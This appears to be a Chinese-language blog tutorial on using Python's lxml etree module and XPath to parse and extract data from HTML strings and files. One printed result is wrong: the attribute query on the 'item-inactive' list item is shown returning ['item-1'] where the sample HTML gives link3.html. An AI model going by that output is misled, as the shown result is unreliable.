<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt; </span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> <span class="comment"># 上面li 节点是没有闭合的，但是 etree 模块可以自动修正 HTML 文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  tostring() 方法即可输出修正后的 HTML 代码，叫转换后的html对象给解析成可以看懂的</span></span><br><span class="line">result = etree.tostring(html)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 `decode()` 方法将其转成 utf-8的str类型</span></span><br><span class="line">result= result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出他的类型</span></span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他是str类型了，修复了<code>html</code>的代码还可以看见多了一个<code>&lt;/li&gt;</code>给前面的<code>&lt;li class=&quot;item-0&quot;&gt;</code>闭合了，还添加了<code>&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code>，但是下面结果还有一个<code>&amp;#29228</code>看不懂的代码可以设置<code>tostring()</code>编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;&amp;#29228;&amp;#34411;&lt;/a&gt; </span><br><span class="line">     &lt;/li&gt;&lt;/ul&gt;</span><br><span class="line"> &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824123822486.png" alt="image-20210824123822486"></p>
<div class="note info simple"><p>但是上面结果还有一个<code>&amp;#29228</code>看不懂的代码可以设置<code>tostring()</code>编码他的参数是<code>encoding=&quot;要设置输出的编码&quot;</code></p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt; </span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> <span class="comment"># 上面li 节点是没有闭合的，但是 etree 模块可以自动修正 HTML 文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  tostring() 方法即可输出修正后的 HTML 代码，叫转换后的html对象给解析成可以看懂的</span></span><br><span class="line">result = etree.tostring(html,encoding=<span class="string">&quot;utf8&quot;</span>)  <span class="comment"># 设置输出的编码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 `decode()` 方法将其转成 utf-8的str类型</span></span><br><span class="line">result= result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出他的类型</span></span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他的编码问题也解决了中文字符正常输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;&lt;body&gt;&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt; </span><br><span class="line">     &lt;/li&gt;&lt;/ul&gt;</span><br><span class="line"> &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824123228553.png" alt="image-20210824123228553"></p>
<h2 id="html文件内容解析"><a href="#html文件内容解析" class="headerlink" title="html文件内容解析"></a>html文件内容解析</h2><div class="note info simple"><p>比如我有一个有一个html，想爬去里面的内容，<code>lxml</code>库有一个<code>etree</code> 模块下有<code>parse</code>类，就可以文件解析了</p>
</div>

<p>我创建一个a.html文件内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-0&quot;&gt;&lt;a href&#x3D;&quot;link1.html&quot;&gt;first item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-1&quot;&gt;&lt;a href&#x3D;&quot;link2.html&quot;&gt;second item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-inactive&quot;&gt;&lt;a href&#x3D;&quot;link3.html&quot;&gt;third item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-1&quot;&gt;&lt;a href&#x3D;&quot;link4.html&quot;&gt;fourth item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-0&quot;&gt;&lt;a href&#x3D;&quot;link5.html&quot;&gt;爬虫&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">     &lt;&#x2F;ul&gt;</span><br><span class="line"> &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<p>文件解析代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个parse类，叫文件内容进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.parse(<span class="string">r&#x27;./a.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  tostring() 方法即可输出修正后的 HTML 代码，叫转换后的html对象给解析成可以看懂的</span></span><br><span class="line">result = etree.tostring(html,encoding=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 `decode()` 方法将其转成 utf-8的str类型</span></span><br><span class="line">result= result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出他的类型</span></span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure>
<p>结果：可以看见和上面都一样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;&amp;#29228;&amp;#34411;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line"> &lt;/div&gt;</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824125631276.png" alt="image-20210824125631276"></p>
<div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>这个文件导入你会发现如果标签什么缺失他就会报错</p>
</div>

<p><code>a.htm</code>l文件少了一个<code>&lt;/li&gt;</code>标签</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824130131582.png" alt="image-20210824130131582"></p>
<p>运行结果他就会报错</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824130230030.png" alt="image-20210824130230030"></p>
<div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>我们可以用<code>lxml</code>库有一个<code>etree</code> 模块下有<code>HTMLParser()</code>类指定解析器HTMLParser会根据文件修复HTML文件中缺失比如标签</p>
</div>

<p>测试</p>
<p>a.html文件内容我故意少了几个标签</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824162816012.png" alt="image-20210824162816012"></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个parse类，叫文件内容进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.parse(<span class="string">r&#x27;./a.html&#x27;</span>,etree.HTMLParser(encoding=<span class="string">&quot;utf8&quot;</span>)) <span class="comment"># `HTMLParser()`类指定解析器HTMLParser会根据文件修复HTML文件中缺失比如标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  tostring() 方法即可输出修正后的 HTML 代码，叫转换后的html对象给解析成可以看懂的</span></span><br><span class="line">result = etree.tostring(html,encoding=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 `decode()` 方法将其转成 utf-8的str类型</span></span><br><span class="line">result= result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出他的类型</span></span><br><span class="line">print(type(result))</span><br></pre></td></tr></table></figure>
<p>结果：可以看见没有报错，前面缺少的标签也给补了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;REC-html40&#x2F;loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;div&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-0&quot;&gt;&lt;a href&#x3D;&quot;link1.html&quot;&gt;first item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-1&quot;&gt;&lt;a href&#x3D;&quot;link2.html&quot;&gt;second item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-inactive&quot;&gt;&lt;a href&#x3D;&quot;link3.html&quot;&gt;third item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">         &lt;li class&#x3D;&quot;item-1&quot;&gt;&lt;a href&#x3D;&quot;link4.html&quot;&gt;fourth item&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;li class&#x3D;&quot;item-0&quot;&gt;&lt;a href&#x3D;&quot;link5.html&quot;&gt;爬虫&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line"> &lt;&#x2F;li&gt;&lt;&#x2F;ul&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br><span class="line">&lt;class &#39;str&#39;&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824162945578.png" alt="image-20210824162945578"></p>
<h1 id="lxml库XPath提取数据"><a href="#lxml库XPath提取数据" class="headerlink" title="lxml库XPath提取数据"></a>lxml库XPath提取数据</h1><div class="note info simple"><p>只要你用<code>lxml</code>库有一个<code>etree </code>模块下有一个<code>XPath</code>方法，用这个方法的XPath语法就可以进行数据的提取了，他返回的是一个列表</p>
</div>

<h2 id="提取全部"><a href="#提取全部" class="headerlink" title="提取全部"></a>提取全部</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt;&lt;/li&gt;  </span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个`XPath`方法，用这个方法的XPath语法就可以进行数据的提取了</span></span><br><span class="line">divs=html.xpath(<span class="string">r&#x27;//li&#x27;</span>) <span class="comment"># 指定搜索全部的&lt;li&gt;标签</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(divs)</span><br><span class="line"><span class="comment"># 指定输出第一个</span></span><br><span class="line">print(divs[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<p>结果：可以看见一个列表对象里面都是html对象，我指定输出了第一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&lt;Element li at 0x7f39af5e0f00&gt;, &lt;Element li at 0x7f39af5e0f40&gt;, &lt;Element li at 0x7f39af5e0f80&gt;, &lt;Element li at 0x7f39af5e0fc0&gt;, &lt;Element li at 0x7f39af5e8040&gt;]</span><br><span class="line">&lt;Element li at 0x7f39af5e0f00&gt;</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>叫html对象解析成字符串</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt;&lt;/li&gt;  </span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个`XPath`方法，用这个方法的XPath语法就可以进行数据的提取了</span></span><br><span class="line">divs=html.xpath(<span class="string">r&#x27;//li&#x27;</span>) <span class="comment"># 指定搜索全部的&lt;li&gt;标签</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  tostring() 方法即可输出修正后的 HTML 代码，叫转换后的html对象给解析成可以看懂的</span></span><br><span class="line">result = etree.tostring(divs[<span class="number">0</span>],encoding=<span class="string">&quot;utf8&quot;</span>)  <span class="comment"># 指定输出第一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 `decode()` 方法将其转成 utf-8的str类型</span></span><br><span class="line">result= result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>结果：可以看见我们指定输出第一个，可以看见结果是正确的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210824170120291.png" alt="image-20210824170120291"></p>
<h2 id="提取子节点内容"><a href="#提取子节点内容" class="headerlink" title="提取子节点内容"></a>提取子节点内容</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个`XPath`方法，用这个方法的XPath语法就可以进行数据的提取了</span></span><br><span class="line">divs=html.xpath(<span class="string">r&#x27;//ul/li&#x27;</span>) <span class="comment"># 指定搜索全部的&lt;li&gt;标签</span></span><br><span class="line"></span><br><span class="line">print(divs)</span><br></pre></td></tr></table></figure>
<p>结果：可以看见他是一个Element对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[&lt;Element li at <span class="number">0x7fb8549b70c0</span>&gt;, &lt;Element li at <span class="number">0x7fb8549b7100</span>&gt;, &lt;Element li at <span class="number">0x7fb8549b7140</span>&gt;, &lt;Element li at <span class="number">0x7fb8549b7180</span>&gt;, &lt;Element li at <span class="number">0x7fb8549b71c0</span>&gt;]</span><br></pre></td></tr></table></figure>




<h2 id="提取属性内容"><a href="#提取属性内容" class="headerlink" title="提取属性内容"></a>提取属性内容</h2><div class="note info simple"><p>提取属性什么都不需要转义的</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link5.html&quot;&gt;爬虫&lt;/a&gt;  </span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个`XPath`方法，用这个方法的XPath语法就可以进行数据的提取了</span></span><br><span class="line">divs=html.xpath(<span class="string">r&#x27;//li[@class=&quot;item-inactive&quot;]/a/@href&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(divs)</span><br></pre></td></tr></table></figure>
<p><code>//li[@class=&quot;item-inactive&quot;]/a/@href</code>意思就是，li标签里面有<code>class=&quot;item-inactive&quot;</code>属性的子标签<code>a</code>的<code>href</code>属性的内容</p>
<p>结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&#x27;item-1&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825111019199.png" alt="image-20210825111019199"></p>
<h2 id="提取父节点内容"><a href="#提取父节点内容" class="headerlink" title="提取父节点内容"></a>提取父节点内容</h2><div class="note info simple"><p>可以用<code>..</code>来实现</p>
</div>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree  <span class="comment"># 导入lxml库</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;</span></span><br><span class="line"><span class="string">         &lt;/li&gt;</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> <span class="comment"># 上面li 节点是没有闭合的，但是 etree 模块可以自动修正 HTML 文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个html类，叫html的字符串进行初始化，构造一个 XPath 解析对象</span></span><br><span class="line">html = etree.HTML(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># etree 模块下有一个`XPath`方法，用这个方法的XPath语法就可以进行数据的提取了</span></span><br><span class="line">divs=html.xpath(<span class="string">r&#x27;//a/../@class&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">print(divs)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;item-0&#39;]</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210825111831691.png" alt="image-20210825111831691"></p>
<h2 id="文本获取"><a href="#文本获取" class="headerlink" title="文本获取"></a>文本获取</h2><div class="note info simple"><p>我们用 XPath 中的 <code>text()</code> 方法获取节点中的文本</p>
</div>

